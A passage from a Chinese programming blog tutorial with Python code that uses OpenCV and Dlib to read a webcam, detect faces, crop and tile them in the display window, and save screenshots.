&lt;span&gt;14&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 设置视频参数: propId - 设置的视频参数, value - 设置的参数值&lt;/span&gt;
&lt;span&gt;15&lt;/span&gt; cap.set(3, 480&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; 
&lt;span&gt;17&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; cap.isOpened() 返回 true/false, 检查摄像头初始化是否成功&lt;/span&gt;
&lt;span&gt;18&lt;/span&gt; &lt;span&gt;print&lt;/span&gt;&lt;span&gt;(cap.isOpened())
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; 
&lt;span&gt;20&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; cap.read()&lt;/span&gt;
&lt;span&gt;21&lt;/span&gt; &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt; 
&lt;span&gt;22&lt;/span&gt; &lt;span&gt;返回两个值
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt; &lt;span&gt;    先返回一个布尔值, 如果视频读取正确, 则为 True, 如果错误, 则为 False; 
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt; &lt;span&gt;    也可用来判断是否到视频末尾;
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt;     
&lt;span&gt;26&lt;/span&gt; &lt;span&gt;    再返回一个值, 为每一帧的图像, 该值是一个三维矩阵;
&lt;/span&gt;&lt;span&gt;27&lt;/span&gt;     
&lt;span&gt;28&lt;/span&gt; &lt;span&gt;    通用接收方法为: 
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt; &lt;span&gt;        ret,frame = cap.read();
&lt;/span&gt;&lt;span&gt;30&lt;/span&gt; &lt;span&gt;        ret: 布尔值;
&lt;/span&gt;&lt;span&gt;31&lt;/span&gt; &lt;span&gt;        frame: 图像的三维矩阵;
&lt;/span&gt;&lt;span&gt;32&lt;/span&gt; &lt;span&gt;        这样 ret 存储布尔值, frame 存储图像;
&lt;/span&gt;&lt;span&gt;33&lt;/span&gt;         
&lt;span&gt;34&lt;/span&gt; &lt;span&gt;        若使用一个变量来接收两个值, 如:
&lt;/span&gt;&lt;span&gt;35&lt;/span&gt; &lt;span&gt;            frame = cap.read()
&lt;/span&gt;&lt;span&gt;36&lt;/span&gt; &lt;span&gt;        则 frame 为一个元组, 原来使用 frame 处需更改为 frame[1]
&lt;/span&gt;&lt;span&gt;37&lt;/span&gt; &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;38&lt;/span&gt; 
&lt;span&gt;39&lt;/span&gt; &lt;span&gt;while&lt;/span&gt;&lt;span&gt; cap.isOpened():
&lt;/span&gt;&lt;span&gt;40&lt;/span&gt;     ret_flag, img_camera =&lt;span&gt; cap.read()
&lt;/span&gt;&lt;span&gt;41&lt;/span&gt;     cv2.imshow(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;camera&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, img_camera)
&lt;/span&gt;&lt;span&gt;42&lt;/span&gt; 
&lt;span&gt;43&lt;/span&gt;     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 每帧数据延时 1ms, 延时为0, 读取的是静态帧&lt;/span&gt;
&lt;span&gt;44&lt;/span&gt;     k = cv2.waitKey(1&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;45&lt;/span&gt; 
&lt;span&gt;46&lt;/span&gt;     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 按下 's' 保存截图&lt;/span&gt;
&lt;span&gt;47&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; k == ord(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;s&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;):
&lt;/span&gt;&lt;span&gt;48&lt;/span&gt;         cv2.imwrite(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;test.jpg&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, img_camera)
&lt;/span&gt;&lt;span&gt;49&lt;/span&gt; 
&lt;span&gt;50&lt;/span&gt;     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 按下 'q' 退出&lt;/span&gt;
&lt;span&gt;51&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; k == ord(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;q&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;):
&lt;/span&gt;&lt;span&gt;52&lt;/span&gt;         &lt;span&gt;break&lt;/span&gt;
&lt;span&gt;53&lt;/span&gt; 
&lt;span&gt;54&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 释放所有摄像头&lt;/span&gt;
&lt;span&gt;55&lt;/span&gt; &lt;span&gt;cap.release()
&lt;/span&gt;&lt;span&gt;56&lt;/span&gt; 
&lt;span&gt;57&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 删除建立的所有窗口&lt;/span&gt;
&lt;span&gt;58&lt;/span&gt; cv2.destroyAllWindows()
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;2.2 人脸检测&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　利用 Dlib 正向人脸检测器， &lt;em&gt;dlib.get_frontal_face_detector()&lt;/em&gt;；&lt;/p&gt;
&lt;p&gt;　　对于本地人脸图像文件，利用 Dlib 进行人脸检测的例子:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;58&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; created at 2017-11-27&lt;/span&gt;
&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; updated at 2018-09-06&lt;/span&gt;
&lt;span&gt; 3&lt;/span&gt; 
&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; Author:   coneypo&lt;/span&gt;
&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; Dlib:     http://dlib.net/&lt;/span&gt;
&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; Blog:     http://www.cnblogs.com/AdaminXie/&lt;/span&gt;
&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; Github:   https://github.com/coneypo/Dlib_examples&lt;/span&gt;
&lt;span&gt; 8&lt;/span&gt; 
&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; create object of OpenCv&lt;/span&gt;
&lt;span&gt;10&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; use OpenCv to read and show images&lt;/span&gt;
&lt;span&gt;11&lt;/span&gt; 
&lt;span&gt;12&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; dlib
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; cv2
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; 
&lt;span&gt;15&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 使用 Dlib 的正面人脸检测器 frontal_face_detector&lt;/span&gt;
&lt;span&gt;16&lt;/span&gt; detector =&lt;span&gt; dlib.get_frontal_face_detector()
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; 
&lt;span&gt;18&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 图片所在路径&lt;/span&gt;
&lt;span&gt;19&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; read image&lt;/span&gt;
&lt;span&gt;20&lt;/span&gt; img = cv2.imread(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;imgs/faces_2.jpeg&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt; 
&lt;span&gt;22&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 使用 detector 检测器来检测图像中的人脸&lt;/span&gt;
&lt;span&gt;23&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; use detector of Dlib to detector faces&lt;/span&gt;
&lt;span&gt;24&lt;/span&gt; faces = detector(img, 1&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt; &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;人脸数 / Faces in all: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, len(faces))
&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; 
&lt;span&gt;27&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; Traversal every face&lt;/span&gt;
&lt;span&gt;28&lt;/span&gt; &lt;span&gt;for&lt;/span&gt; i, d &lt;span&gt;in&lt;/span&gt;&lt;span&gt; enumerate(faces):
&lt;/span&gt;&lt;span&gt;29&lt;/span&gt;     &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;第&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, i+1, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;个人脸的矩形框坐标：&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
&lt;/span&gt;&lt;span&gt;30&lt;/span&gt;           &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;left:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, d.left(), &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;right:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, d.right(), &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;top:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, d.top(), &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;bottom:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, d.bottom())
&lt;/span&gt;&lt;span&gt;31&lt;/span&gt;     cv2.rectangle(img, tuple([d.left(), d.top()]), tuple([d.right(), d.bottom()]), (0, 255, 255), 2&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;32&lt;/span&gt; 
&lt;span&gt;33&lt;/span&gt; cv2.namedWindow(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;img&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, 2&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;34&lt;/span&gt; cv2.imshow(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;img&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;, img)
&lt;/span&gt;&lt;span&gt;35&lt;/span&gt; cv2.waitKey(0)
&lt;/pre&gt;&lt;/div&gt;


&lt;center readability=&quot;5&quot;&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1152352/201901/1152352-20190124211018822-111700790.png&quot; alt=&quot;&quot; width=&quot;469&quot; height=&quot;447&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;图 3 参数 d.top(), d.right(), d.left(), d.bottom() 位置坐标说明&lt;/strong&gt;&lt;/p&gt;
&lt;/center&gt;

&lt;p&gt;&lt;strong&gt;2.3 图像裁剪&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　如果想访问图像的某点像素，对于 opencv 对象可以利用索引 &lt;strong&gt;img [height] [width]&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;　　　　存储像素其实是一个三维数组，先 &lt;strong&gt;高度 height&lt;/strong&gt;，然后 &lt;strong&gt;宽度 width&lt;/strong&gt;;&lt;/p&gt;
&lt;p&gt;　　　　返回的是一个颜色数组（ 0-255，0-255，0-255 ），按照（ B, G, R ）的顺序；&lt;/p&gt;
&lt;p&gt;　　　　比如 蓝色 就是（255，0，0），红色 是（0，0，255）;&lt;/p&gt;
&lt;p&gt;　　所以进行图像裁剪填充这块的代码如下（注意超出 640x480 区域时的处理）:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 记录每次开始写入人脸像素的宽度位置&lt;/span&gt;
blank_start =&lt;span&gt; 0
&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 如果没有超出摄像头边界&lt;/span&gt;
&lt;span&gt;if&lt;/span&gt; (d.bottom() &amp;lt; 480) &lt;span&gt;and&lt;/span&gt; (d.right() &amp;lt; 640&lt;span&gt;):
    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; k, d &lt;span&gt;in&lt;/span&gt;&lt;span&gt; enumerate(faces):
        height &lt;/span&gt;= d.bottom() -&lt;span&gt; d.top()
        width &lt;/span&gt;= d.right() -&lt;span&gt; d.left()

        &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 如果没有超出摄像头边界&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt; ((d.top()+height) &amp;lt; 480) &lt;span&gt;and&lt;/span&gt; ((d.left()+width)&amp;lt;640&lt;span&gt;):
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 填充&lt;/span&gt;
            &lt;span&gt;for&lt;/span&gt; i &lt;span&gt;in&lt;/span&gt;&lt;span&gt; range(height):
                &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; j &lt;span&gt;in&lt;/span&gt;&lt;span&gt; range(width):
                    img_rd[i][blank_start &lt;/span&gt;+ j] =&lt;span&gt; \
                        img_rd[d.top() &lt;/span&gt;+ i][d.left() +&lt;span&gt; j]
            &lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; 调整图像&lt;/span&gt;
            blank_start += width
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt; 　　记得要更新 blank_start 的坐标，达到依次平铺的效果:&lt;/p&gt;

&lt;center readability=&quot;2&quot;&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1152352/201901/1152352-20190124213604901-254256840.png&quot; alt=&quot;&quot; width=&quot;953&quot; height=&quot;285&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;图 4 平铺显示的人脸&lt;/strong&gt;&lt;/p&gt;
&lt;/center&gt;

&lt;p&gt;&lt;strong&gt;2.4. 完整源码&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;a title=&quot;faces_from_camera.py&quot; href=&quot;https://github.com/coneypo/Dlib_face_cut/blob/master/faces_from_camera.py&quot; target=&quot;_blank&quot;&gt;https://github.com/coneypo/Dlib_face_cut/blob/master/faces_from_camera.py&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;98&quot;&gt;
&lt;pre&gt;
&lt;span&gt;  1&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 调用摄像头实时单个/多个人脸检测，并依次在摄像头窗口，实时平铺显示检测到的人脸；&lt;/span&gt;
&lt;span&gt;  2&lt;/span&gt; 
&lt;span&gt;  3&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; Author:   coneypo&lt;/span&gt;
&lt;span&gt;  4&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; Blog:     http://www.cnblogs.com/AdaminXie&lt;/span&gt;
&lt;span&gt;  5&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; GitHub:   https://github.com/coneypo/Dlib_face_detection_from_camera&lt;/span&gt;
&lt;span&gt;  6&lt;/span&gt; 
&lt;span&gt;  7&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; dlib
&lt;/span&gt;&lt;span&gt;  8&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; cv2
&lt;/span&gt;&lt;span&gt;  9&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; time
&lt;/span&gt;&lt;span&gt; 10&lt;/span&gt; &lt;span&gt;import&lt;/span&gt;&lt;span&gt; numpy as np
&lt;/span&gt;&lt;span&gt; 11&lt;/span&gt; 
&lt;span&gt; 12&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 储存截图的目录&lt;/span&gt;
&lt;span&gt; 13&lt;/span&gt; path_screenshots = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;data/images/screenshots/&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;
&lt;span&gt; 14&lt;/span&gt; 
&lt;span&gt; 15&lt;/span&gt; detector =&lt;span&gt; dlib.get_frontal_face_detector()
&lt;/span&gt;&lt;span&gt; 16&lt;/span&gt; predictor = dlib.shape_predictor(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;data/dlib/shape_predictor_68_face_landmarks.dat&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt; 17&lt;/span&gt; 
&lt;span&gt; 18&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 创建 cv2 摄像头对象&lt;/span&gt;
&lt;span&gt; 19&lt;/span&gt; cap =&lt;span&gt; cv2.VideoCapture(0)
&lt;/span&gt;&lt;span&gt; 20&lt;/span&gt; 
&lt;span&gt; 21&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; cap.set(propId, value)&lt;/span&gt;
&lt;span&gt; 22&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 设置视频参数，propId 设置的视频参数，value 设置的参数值&lt;/span&gt;
&lt;span&gt; 23&lt;/span&gt; cap.set(3, 960&lt;span&gt;)
&lt;/span&gt;&lt;span&gt; 24&lt;/span&gt; 
&lt;span&gt; 25&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 截图 screenshots 的计数器&lt;/span&gt;
&lt;span&gt; 26&lt;/span&gt; cnt =&lt;span&gt; 0
&lt;/span&gt;&lt;span&gt; 27&lt;/span&gt; 
&lt;span&gt; 28&lt;/span&gt; &lt;span&gt;#&lt;/span&gt;&lt;span&gt; cap.isOpened() 返回 true/false 检查初始化是否成功&lt;/span&gt;
&lt;span&gt; 29&lt;/span&gt; &lt;span&gt;while&lt;/span&gt;&lt;span&gt; cap.isOpened():
&lt;/span&gt;&lt;span&gt; 30&lt;/span&gt; 
&lt;span&gt; 31&lt;/span&gt;     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; cap.read()&lt;/span&gt;
&lt;span&gt; 32&lt;/span&gt;     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 返回两个值：&lt;/span&gt;
&lt;span&gt; 33&lt;/span&gt;     &lt;span&gt;#&lt;/span&gt;&lt;span&gt;    一个布尔值 true/false，用来判断读取视频是否成功/是否到视频末尾&lt;/span&gt;
&lt;span&gt; 34&lt;/span&gt;     &lt;span&gt;#&lt;/span&gt;&lt;span&gt;    图像对象，图像的三维矩阵&lt;/span&gt;
&lt;span&gt; 35&lt;/span&gt;     flag, img_rd =&lt;span&gt; cap.read()
&lt;/span&gt;&lt;span&gt; 36&lt;/span&gt; 
&lt;span&gt; 37&lt;/span&gt;     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 每帧数据延时 1ms，延时为 0 读取的是静态帧&lt;/span&gt;
&lt;span&gt; 38&lt;/span&gt;     k = cv2.waitKey(1&lt;span&gt;)
&lt;/span&gt;&lt;span&gt; 39&lt;/span&gt; 
&lt;span&gt; 40&lt;/span&gt;     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 取灰度&lt;/span&gt;
&lt;span&gt; 41&lt;/span&gt;     img_gray =&lt;span&gt; cv2.cvtColor(img_rd, cv2.COLOR_RGB2GRAY)
&lt;/span&gt;&lt;span&gt; 42&lt;/span&gt; 
&lt;span&gt; 43&lt;/span&gt;     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 人脸数&lt;/span&gt;
&lt;span&gt; 44&lt;/span&gt;     faces =&lt;span&gt; detector(img_gray, 0)
&lt;/span&gt;&lt;span&gt; 45&lt;/span&gt; 
&lt;span&gt; 46&lt;/span&gt;     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 待会要写的字体&lt;/span&gt;
&lt;span&gt; 47&lt;/span&gt;     font =&lt;span&gt; cv2.FONT_HERSHEY_SIMPLEX
&lt;/span&gt;&lt;span&gt; 48&lt;/span&gt; 
&lt;span&gt; 49&lt;/span&gt;     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 按下 'q' 键退出&lt;/span&gt;
&lt;span&gt; 50&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; k == ord(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;q&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;):
&lt;/span&gt;&lt;span&gt; 51&lt;/span&gt;         &lt;span&gt;break&lt;/span&gt;
&lt;span&gt; 52&lt;/span&gt;     &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt; 53&lt;/span&gt;         &lt;span&gt;if&lt;/span&gt; len(faces) !=&lt;span&gt; 0:
&lt;/span&gt;&lt;span&gt; 54&lt;/span&gt;             &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 检测到人脸&lt;/span&gt;
&lt;span&gt; 55&lt;/span&gt;             &lt;span&gt;for&lt;/span&gt; kk, d &lt;span&gt;in&lt;/span&gt;&lt;span&gt; enumerate(faces):
&lt;/span&gt;&lt;span&gt; 56&lt;/span&gt;                 &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 绘制矩形框&lt;/span&gt;
&lt;span&gt; 57&lt;/span&gt;                 cv2.rectangle(img_rd, tuple([d.left(), d.top()]), tuple([d.right(), d.bottom()]), (0, 255, 255), 2&lt;span&gt;)
&lt;/span&gt;&lt;span&gt; 58&lt;/span&gt; 
&lt;span&gt; 59&lt;/span&gt;                 height = d.bottom() -&lt;span&gt; d.top()
&lt;/span&gt;&lt;span&gt; 60&lt;/span&gt;                 width = d.right() -&lt;span&gt; d.left()
&lt;/span&gt;&lt;span&gt; 61&lt;/span&gt; 
&lt;span&gt; 62&lt;/span&gt;                 &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 生成用来显示的图像&lt;/span&gt;
&lt;span&gt; 63&lt;/span&gt;                 img_blank = np.zeros((height, width, 3&lt;span&gt;), np.uint8)
&lt;/span&gt;&lt;span&gt; 64&lt;/span&gt; 
&lt;span&gt; 65&lt;/span&gt;                 &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 记录每次开始写入人脸像素的宽度位置&lt;/span&gt;
&lt;span&gt; 66&lt;/span&gt;                 blank_start =&lt;span&gt; 0
&lt;/span&gt;&lt;span&gt; 67&lt;/span&gt;                 &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 如果没有超出摄像头边界&lt;/span&gt;
&lt;span&gt; 68&lt;/span&gt;                 &lt;span&gt;if&lt;/span&gt; (d.bottom() &amp;lt; 480) &lt;span&gt;and&lt;/span&gt; (d.right() &amp;lt; 640&lt;span&gt;):
&lt;/span&gt;&lt;span&gt; 69&lt;/span&gt;                     &lt;span&gt;for&lt;/span&gt; k, d &lt;span&gt;in&lt;/span&gt;&lt;span&gt; enumerate(faces):
&lt;/span&gt;&lt;span&gt; 70&lt;/span&gt;                         height = d.bottom() -&lt;span&gt; d.top()
&lt;/span&gt;&lt;span&gt; 71&lt;/span&gt;                         width = d.right() -&lt;span&gt; d.left()
&lt;/span&gt;&lt;span&gt; 72&lt;/span&gt; 
&lt;span&gt; 73&lt;/span&gt;                         &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 如果没有超出摄像头边界&lt;/span&gt;
&lt;span&gt; 74&lt;/span&gt;                         &lt;span&gt;if&lt;/span&gt; ((d.top()+height) &amp;lt; 480) &lt;span&gt;and&lt;/span&gt; ((d.left()+width)&amp;lt;640&lt;span&gt;):
&lt;/span&gt;&lt;span&gt; 75&lt;/span&gt;                             &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 填充&lt;/span&gt;
&lt;span&gt; 76&lt;/span&gt;                             &lt;span&gt;for&lt;/span&gt; i &lt;span&gt;in&lt;/span&gt;&lt;span&gt; range(height):
&lt;/span&gt;&lt;span&gt; 77&lt;/span&gt;                                 &lt;span&gt;for&lt;/span&gt; j &lt;span&gt;in&lt;/span&gt;&lt;span&gt; range(width):
&lt;/span&gt;&lt;span&gt; 78&lt;/span&gt;                                     img_rd[i][blank_start + j] =&lt;span&gt; \
&lt;/span&gt;&lt;span&gt; 79&lt;/span&gt;                                         img_rd[d.top() + i][d.left() +&lt;span&gt; j]
&lt;/span&gt;&lt;span&gt; 80&lt;/span&gt;                             &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 调整图像&lt;/span&gt;
&lt;span&gt; 81&lt;/span&gt;                             blank_start +=&lt;span&gt; width
&lt;/span&gt;&lt;span&gt; 82&lt;/span&gt; 
&lt;span&gt; 83&lt;/span&gt;             cv2.putText(img_rd, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Faces in all: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; + str(len(faces)), (20, 350), font, 0.8, (0, 0, 0), 1&lt;span&gt;, cv2.LINE_AA)
&lt;/span&gt;&lt;span&gt; 84&lt;/span&gt; 
&lt;span&gt; 85&lt;/span&gt;         &lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt; 86&lt;/span&gt;             &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 没有检测到人脸&lt;/span&gt;
&lt;span&gt; 87&lt;/span&gt;             cv2.putText(img_rd, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;no face&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, (20, 350), font, 0.8, (0, 0, 0), 1&lt;span&gt;, cv2.LINE_AA)
&lt;/span&gt;&lt;span&gt; 88&lt;/span&gt; 
&lt;span&gt; 89&lt;/span&gt;         &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 添加说明&lt;/span&gt;
&lt;span&gt; 90&lt;/span&gt;         img_rd = cv2.putText(img_rd, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Press 'S': Screen shot&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, (20, 400), font, 0.8, (255, 255, 255), 1&lt;span&gt;, cv2.LINE_AA)
&lt;/span&gt;&lt;span&gt; 91&lt;/span&gt;         img_rd = cv2.putText(img_rd, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Press 'Q': Quit&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, (20, 450), font, 0.8, (255, 255, 255), 1&lt;span&gt;, cv2.LINE_AA)
&lt;/span&gt;&lt;span&gt; 92&lt;/span&gt; 
&lt;span&gt; 93&lt;/span&gt;     &lt;span&gt;#&lt;/span&gt;&lt;span&gt; 按下 's' 键保存&lt;/span&gt;
&lt;span&gt; 94&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; k == ord(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;s&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;):
&lt;/span&gt;&lt;span&gt; 95&lt;/span&gt;         cnt += 1
&lt;span&gt; 96&lt;/span&gt;         &lt;span&gt;print&lt;/span&gt;(path_screenshots + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;screenshot&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;_&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; + str(cnt) + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;_&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; + time.strftime(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;%Y-%m-%d-%H-%M-%S&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
&lt;/span&gt;&lt;span&gt; 97&lt;/span&gt;                                                                                      time.localtime()) + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;.jpg&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt; 98&lt;/span&gt;         cv2.imwrite(path_screenshots + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;screenshot&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;_&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; + str(cnt) + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;_&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; + time.strftime(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;%Y-%m-%d-%H-%M-%S&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
&lt;/span&gt;&lt;span&gt; 99&lt;/span&gt;                                                                                            time.localtime()) + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;.jpg&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
&lt;/span&gt;&lt;span&gt;100&lt;/span&gt; &lt;span&gt;                    img_rd)
&lt;/span&gt;&lt;span&gt;101&lt;/span&gt; 
